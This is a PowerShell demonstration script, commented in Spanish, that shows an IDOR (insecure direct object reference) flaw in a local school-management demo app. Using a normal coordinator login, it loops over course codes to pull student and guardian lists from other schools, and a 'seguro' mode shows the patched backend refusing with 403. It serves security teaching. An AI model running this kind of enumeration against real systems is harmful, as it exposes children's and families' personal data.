# Por qué el IDOR es grave: con un login normal (Lucía, coordinadora del Colegio San Martín) y un bucle,
# alguien prueba códigos de curso y se lleva los estudiantes y acudientes de TODOS los colegios.
# Solo contra la app local de la demo (127.0.0.1:8082).
#
#   .\enumerar.ps1                  # backend vulnerable
#   .\enumerar.ps1 -Modo seguro     # backend seguro: 403 en todo lo que no es de su colegio
param(
    [ValidateSet("vulnerable", "seguro")][string]$Modo = "vulnerable",
    [string]$Base = "http://127.0.0.1:8082"
)

[Console]::OutputEncoding = [Text.Encoding]::UTF8
$cred = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("lucia:lucia123"))
# El header es legítimo: es el colegio de Lucía, y el API Gateway lo aprueba.
$headers = @{ Authorization = "Basic $cred"; "X-Colegio" = "DANE-111001000101" }

"Sesión: lucia · X-Colegio: DANE-111001000101 (Colegio San Martín) · backend $Modo`n"
"{0,-6} {1,-7} {2,-22} {3,-22} {4,11}" -f "Curso", "Estado", "Colegio", "Curso", "Estudiantes"
foreach ($prefijo in 1..3) {
    foreach ($n in 1..3) {
        $codigo = "{0}00{1}" -f $prefijo, $n
        try {
            $r = Invoke-WebRequest -UseBasicParsing -Uri "$Base/api/$Modo/cursos/$codigo/estudiantes" -Headers $headers
            # Se decodifica como UTF-8 a mano: Windows PowerShell 5.1 asume Latin-1 si no viene charset
            $d = [Text.Encoding]::UTF8.GetString($r.RawContentStream.ToArray()) | ConvertFrom-Json
            "{0,-6} {1,-7} {2,-22} {3,-22} {4,11}" -f $codigo, "200", $d.colegio.nombre, ($d.curso.nombre + " " + $d.curso.grado), $d.estudiantes.Count
        } catch {
            $st = [int]$_.Exception.Response.StatusCode
            if ($st -ne 404) { "{0,-6} {1,-7}" -f $codigo, $st }
        }
    }
}
